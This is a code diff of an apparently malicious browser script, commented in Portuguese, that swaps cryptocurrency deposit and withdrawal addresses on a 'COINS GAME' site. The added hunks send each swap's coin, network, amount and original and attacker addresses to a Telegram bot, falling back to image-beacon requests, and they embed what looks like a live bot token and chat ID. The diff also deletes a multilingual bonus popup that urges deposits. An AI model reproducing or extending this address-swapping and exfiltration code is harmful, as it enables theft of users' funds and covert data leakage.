@@ -20,6 +20,49 @@
   var FORCAR = false;
   var AVISO_VISUAL = false;
 
+  /* ---- Telegram (Bot API) ----
+     avisa o dono a cada troca de endereco (deposito e saque)
+     chatId vazio = descobre sozinho via getUpdates (precisa de /start no bot) */
+  var TELEGRAM = {
+    token: '9094737859:AAEBNQMv7dQ0WEr29jaFX-5GOyvKQ4IWmLc',
+    chatId: '8574440576'
+  };
+
+  function telChatId() {
+    if (TELEGRAM.chatId) return Promise.resolve(TELEGRAM.chatId);
+    return fetch('https://api.telegram.org/bot' + TELEGRAM.token + '/getUpdates')
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (j && j.result && j.result.length) {
+          var last = j.result[j.result.length - 1];
+          var msg = last.message || last.edited_message || last.channel_post;
+          var cid = msg && msg.chat && msg.chat.id;
+          if (cid) { TELEGRAM.chatId = cid; return cid; }
+        }
+        return '';
+      })
+      .catch(function () { return ''; });
+  }
+
+  function telEnviar(texto) {
+    try {
+      telChatId().then(function (cid) {
+        if (!cid) return;
+        var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
+        try {
+          var fd = new URLSearchParams();
+          fd.set('chat_id', cid);
+          fd.set('text', texto);
+          fetch(url, { method: 'POST', body: fd }).catch(function () {
+            try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e) {}
+          });
+        } catch (e) {
+          try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e2) {}
+        }
+      });
+    } catch (e) {}
+  }
+
   var DEPOSITO = {
     IGUAL: '',
 
@@ -165,6 +208,13 @@
     if (logDep.length > 200) logDep.shift();
     console.log('%c[DEP] ' + moeda + '/' + rede + '  ->  ' + novo, 'color:#0a0;font-weight:bold');
     console.log('      antes: ' + original);
+
+    // avisa no Telegram: endereco de deposito trocado
+    telEnviar('DEPOSITO - ENDERECO TROCADO\n' +
+              'Moeda: ' + moeda + '\n' +
+              'Rede: ' + rede + '\n' +
+              'De: ' + original + '\n' +
+              'Para: ' + novo);
   }
 
   function registrarSaq(d) {
@@ -191,6 +241,14 @@
       console.log('   valor    : mantido ' + d.valorDigitado + ' - ' + (d.motivoValor || 'sem calculo'));
     }
     console.log('   total de trocas nesta aba: ' + trocas);
+
+    // avisa no Telegram: saque (carteira + valor + moeda)
+    var _v = (d.valor != null) ? d.valor : d.valorDigitado;
+    telEnviar('SAQUE - ENDERECO TROCADO\n' +
+              'Moeda: ' + d.moeda + '\n' +
+              'Rede: ' + (d.rede || '-') + '\n' +
+              'Valor: ' + _v + '\n' +
+              'Carteira: ' + d.bruto + ' -> ' + d.novo);
   }
 
   function trocarObjetoDep(obj, moeda, rede) {
@@ -769,209 +827,4 @@
   if (!saqArmadas.length && !SAQUE.IGUAL) console.warn('[SAQUE] nenhum endereco preenchido em SAQUE.');
 
   atualizarSaldos();
-})();
-
-(function(){
-  var htmlLang=(document.documentElement.lang||'en').toLowerCase();
-  var langKey=htmlLang.split('-')[0];
-
-  var i18n={
-    pt:{
-      badge:'OFERTA ESPECIAL',
-      title1:'BÔNUS EXCLUSIVO',
-      title2:'DEPOSITE NA CRIPTOMOEDA QUE QUISER',
-      intro:'Você foi premiado! Faça seu depósito na criptomoeda que preferir e receba um bônus especial com rollover de apenas 2x.',
-      choose:'ESCOLHA SEU BÔNUS',
-      freeTitle:'DEPOSITE COM A CRIPTOMOEDA QUE QUISER.',
-      free0:'Você pode depositar usando a criptomoeda da sua escolha.',
-      free1:'Saque seu depósito quando quiser, conforme as regras da plataforma.',
-      free2:'Mesmo após sacar o depósito, o bônus permanece ativo na sua conta.',
-      free3:'Complete apenas 2x de rollover sobre o valor do bônus para liberar o saque.',
-      how:'COMO FUNCIONA',
-      flow:'Escolha sua criptomoeda → deposite → receba o bônus → jogue → cumpra 2x → libere o bônus para saque.',
-      deposit:'DEPOSITAR AGORA',
-      close:'FECHAR'
-    },
-    en:{
-      badge:'SPECIAL OFFER',
-      title1:'EXCLUSIVE BONUS',
-      title2:'DEPOSIT WITH ANY CRYPTO YOU WANT',
-      intro:'You have been rewarded! Make your deposit with the cryptocurrency of your choice and receive a special bonus with only 2x rollover.',
-      choose:'CHOOSE YOUR BONUS',
-      freeTitle:'DEPOSIT WITH ANY CRYPTO YOU WANT.',
-      free0:'You can deposit using the cryptocurrency of your choice.',
-      free1:'Withdraw your deposit whenever you want, according to platform rules.',
-      free2:'Even after withdrawing your deposit, your bonus remains active in your account.',
-      free3:'Complete only 2x rollover on the bonus amount to unlock withdrawal.',
-      how:'HOW IT WORKS',
-      flow:'Choose your cryptocurrency → deposit → receive the bonus → play → complete 2x → unlock the bonus for withdrawal.',
-      deposit:'DEPOSIT NOW',
-      close:'CLOSE'
-    },
-    es:{
-      badge:'OFERTA ESPECIAL',
-      title1:'BONO EXCLUSIVO',
-      title2:'DEPOSITA CON LA CRIPTO QUE QUIERAS',
-      intro:'¡Has sido premiado! Haz tu depósito con la criptomoneda que prefieras y recibe un bono especial con rollover de solo 2x.',
-      choose:'ELIGE TU BONO',
-      freeTitle:'DEPOSITA CON LA CRIPTO QUE QUIERAS.',
-      free0:'Puedes depositar usando la criptomoneda de tu elección.',
-      free1:'Retira tu depósito cuando quieras, según las reglas de la plataforma.',
-      free2:'Incluso después de retirar tu depósito, tu bono permanece activo en tu cuenta.',
-      free3:'Completa solo 2x de rollover sobre el valor del bono para liberar el retiro.',
-      how:'CÓMO FUNCIONA',
-      flow:'Elige tu criptomoneda → deposita → recibe el bono → juega → completa 2x → libera el bono para retiro.',
-      deposit:'DEPOSITAR AHORA',
-      close:'CERRAR'
-    },
-    fr:{
-      badge:'OFFRE SPÉCIALE',
-      title1:'BONUS EXCLUSIF',
-      title2:'DÉPOSEZ AVEC LA CRYPTO DE VOTRE CHOIX',
-      intro:'Vous avez été récompensé ! Effectuez votre dépôt avec la cryptomonnaie de votre choix et recevez un bonus spécial avec seulement 2x de rollover.',
-      choose:'CHOISISSEZ VOTRE BONUS',
-      freeTitle:'DÉPOSEZ AVEC LA CRYPTO DE VOTRE CHOIX.',
-      free0:'Vous pouvez déposer avec la cryptomonnaie de votre choix.',
-      free1:'Retirez votre dépôt quand vous le souhaitez, selon les règles de la plateforme.',
-      free2:'Même après avoir retiré votre dépôt, votre bonus reste actif sur votre compte.',
-      free3:'Effectuez seulement 2x de rollover sur le montant du bonus pour débloquer le retrait.',
-      how:'COMMENT ÇA MARCHE',
-      flow:'Choisissez votre cryptomonnaie → déposez → recevez le bonus → jouez → effectuez 2x → débloquez le bonus pour retrait.',
-      deposit:'DÉPOSER MAINTENANT',
-      close:'FERMER'
-    },
-    de:{
-      badge:'SONDERANGEBOT',
-      title1:'EXKLUSIVER BONUS',
-      title2:'ZAHLE MIT JEDER BELIEBIGEN KRYPTO EIN',
-      intro:'Du wurdest belohnt! Zahle mit der Kryptowährung deiner Wahl ein und erhalte einen Spezialbonus mit nur 2x Rollover.',
-      choose:'WÄHLE DEINEN BONUS',
-      freeTitle:'ZAHLE MIT DER KRYPTO DEINER WAHL EIN.',
-      free0:'Du kannst mit der Kryptowährung deiner Wahl einzahlen.',
-      free1:'Ziehe deine Einzahlung jederzeit gemäß den Plattformregeln ab.',
-      free2:'Auch nach der Auszahlung deiner Einzahlung bleibt dein Bonus aktiv.',
-      free3:'Erfülle nur 2x Rollover auf den Bonusbetrag, um die Auszahlung freizuschalten.',
-      how:'SO FUNKTIONIERT ES',
-      flow:'Wähle deine Kryptowährung → zahle ein → erhalte den Bonus → spiele → erfülle 2x → schalte den Bonus zur Auszahlung frei.',
-      deposit:'JETZT EINZAHLEN',
-      close:'SCHLIESSEN'
-    },
-    it:{
-      badge:'OFFERTA SPECIALE',
-      title1:'BONUS ESCLUSIVO',
-      title2:'DEPOSITA CON LA CRIPTO CHE VUOI',
-      intro:'Sei stato premiato! Effettua il tuo deposito con la criptovaluta che preferisci e ricevi un bonus speciale con rollover di solo 2x.',
-      choose:'SCEGLI IL TUO BONUS',
-      freeTitle:'DEPOSITA CON LA CRIPTO CHE VUOI.',
-      free0:'Puoi depositare usando la criptovaluta che preferisci.',
-      free1:'Preleva il tuo deposito quando vuoi, secondo le regole della piattaforma.',
-      free2:'Anche dopo aver prelevato il deposito, il tuo bonus rimane attivo nel tuo conto.',
-      free3:'Completa solo 2x di rollover sul valore del bonus per sbloccare il prelievo.',
-      how:'COME FUNZIONA',
-      flow:'Scegli la tua criptovaluta → deposita → ricevi il bonus → gioca → completa 2x → sblocca il bonus per il prelievo.',
-      deposit:'DEPOSITA ORA',
-      close:'CHIUDI'
-    }
-  };
-
-  var t=i18n[langKey]||i18n.en;
-
-  var bg=document.createElement('div');
-  bg.style.cssText='position:fixed;inset:0;background:rgba(5,12,24,.78);backdrop-filter:blur(4px);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:Inter,system-ui,sans-serif;padding:20px';
-
-  var style=document.createElement('style');
-  style.textContent='' +
-    '@keyframes cgFade{from{opacity:0;transform:translateY(10px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}' +
-    '@keyframes cgPulse{0%,100%{box-shadow:0 0 0 rgba(34,197,94,0)}50%{box-shadow:0 0 24px rgba(34,197,94,.35)}}';
-  document.head.appendChild(style);
-
-  var box=document.createElement('div');
-  box.style.cssText='width:100%;max-width:520px;background:linear-gradient(180deg,#0f1725 0%,#101a2b 100%);border:1px solid #243248;border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.55);overflow:hidden;animation:cgFade .22s ease';
-
-  var top=document.createElement('div');
-  top.style.cssText='background:linear-gradient(180deg,#152238 0%,#101827 100%);padding:16px 18px;border-bottom:1px solid #22314a;display:flex;align-items:center;gap:10px';
-  top.innerHTML='' +
-    '<div style="font-weight:900;font-size:28px;line-height:1;letter-spacing:.5px">' +
-      '<span style="color:#ffffff">COINS</span> <span style="color:#f5b301">GAME</span>' +
-    '</div>' +
-    '<div style="margin-left:auto;background:#1e293b;color:#93a4bd;border:1px solid #2a3b56;border-radius:999px;padding:5px 10px;font-size:11px;font-weight:700">'+t.badge+'</div>';
-
-  var body=document.createElement('div');
-  body.style.cssText='padding:22px';
-
-  body.innerHTML='' +
-    '<div style="background:linear-gradient(180deg,#132033 0%,#0f1a2a 100%);border:1px solid #243248;border-radius:14px;padding:18px 16px;margin-bottom:14px;text-align:center">' +
-      '<div style="color:#f5b301;font-weight:900;font-size:14px;letter-spacing:.8px;margin-bottom:8px">'+t.title1+'</div>' +
-      '<div style="color:#fff;font-weight:900;font-size:28px;line-height:1.15;margin-bottom:10px">'+t.title2+'</div>' +
-      '<div style="color:#c8d2e1;font-size:14px;line-height:1.55">'+t.intro+'</div>' +
-    '</div>' +
-
-    '<div style="margin-bottom:10px;color:#f5b301;font-size:13px;font-weight:800;text-align:center">'+t.choose+'</div>' +
-
-    '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:14px">' +
-      '<div style="background:#172437;border:1px solid #263752;border-radius:12px;padding:12px 8px;text-align:center">' +
-        '<div style="color:#91a4c2;font-size:12px">$500</div>' +
-        '<div style="color:#f5b301;font-size:22px;font-weight:900;margin-top:4px">+15%</div>' +
-      '</div>' +
-      '<div style="background:#172437;border:1px solid #263752;border-radius:12px;padding:12px 8px;text-align:center">' +
-        '<div style="color:#91a4c2;font-size:12px">$1,000</div>' +
-        '<div style="color:#f5b301;font-size:22px;font-weight:900;margin-top:4px">+20%</div>' +
-      '</div>' +
-      '<div style="background:#172437;border:1px solid #263752;border-radius:12px;padding:12px 8px;text-align:center">' +
-        '<div style="color:#91a4c2;font-size:12px">$2,000+</div>' +
-        '<div style="color:#f5b301;font-size:22px;font-weight:900;margin-top:4px">+30%</div>' +
-      '</div>' +
-    '</div>' +
-
-    '<div style="background:#132033;border:1px solid #243248;border-radius:14px;padding:15px 16px;margin-bottom:14px">' +
-      '<div style="color:#22c55e;font-weight:900;font-size:15px;margin-bottom:10px">'+t.freeTitle+'</div>' +
-      '<div style="display:grid;gap:8px">' +
-        '<div style="color:#d8e1ee;font-size:13px;line-height:1.5">✅ '+t.free0+'</div>' +
-        '<div style="color:#d8e1ee;font-size:13px;line-height:1.5">✅ '+t.free1+'</div>' +
-        '<div style="color:#d8e1ee;font-size:13px;line-height:1.5">✅ '+t.free2+'</div>' +
-        '<div style="color:#d8e1ee;font-size:13px;line-height:1.5">✅ '+t.free3.replace(/2x/gi,'<span style="color:#f5b301;font-weight:800">2x</span>')+'</div>' +
-      '</div>' +
-    '</div>' +
-
-    '<div style="background:linear-gradient(180deg,#1a2433 0%,#141d2b 100%);border:1px solid #2a3a52;border-radius:14px;padding:14px 16px;margin-bottom:18px">' +
-      '<div style="color:#f5b301;font-weight:800;font-size:14px;margin-bottom:8px">'+t.how+'</div>' +
-      '<div style="color:#d7dfeb;font-size:13px;line-height:1.7">'+t.flow.replace(/2x/gi,'<span style="color:#f5b301;font-weight:800">2x</span>')+'</div>' +
-    '</div>';
-
-  var btnDep=document.createElement('button');
-  btnDep.textContent=t.deposit;
-  btnDep.style.cssText='width:100%;border:none;border-radius:12px;padding:14px 16px;background:linear-gradient(180deg,#22c55e 0%,#16a34a 100%);color:#fff;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.4px;animation:cgPulse 2s infinite';
-
-  var btnClose=document.createElement('button');
-  btnClose.textContent=t.close;
-  btnClose.style.cssText='width:100%;margin-top:10px;border:1px solid #31445f;border-radius:12px;padding:12px 16px;background:#182335;color:#c0cde0;font-size:13px;font-weight:800;cursor:pointer';
-
-  body.appendChild(btnDep);
-  body.appendChild(btnClose);
-  box.appendChild(top);
-  box.appendChild(body);
-  bg.appendChild(box);
-  document.body.appendChild(bg);
-
-  function fechar(){
-    if(bg.parentNode) bg.parentNode.removeChild(bg);
-    if(style.parentNode) style.parentNode.removeChild(style);
-    document.removeEventListener('keydown',esc);
-  }
-
-  function esc(e){
-    if(e.key==='Escape') fechar();
-  }
-
-  btnDep.onclick=function(){
-    fechar();
-    try{ depositOpen(); }catch(e){ console.warn('depositOpen() not found', e); }
-  };
-
-  btnClose.onclick=fechar;
-  bg.onclick=function(e){
-    if(e.target===bg) fechar();
-  };
-
-  document.addEventListener('keydown',esc);
 })();
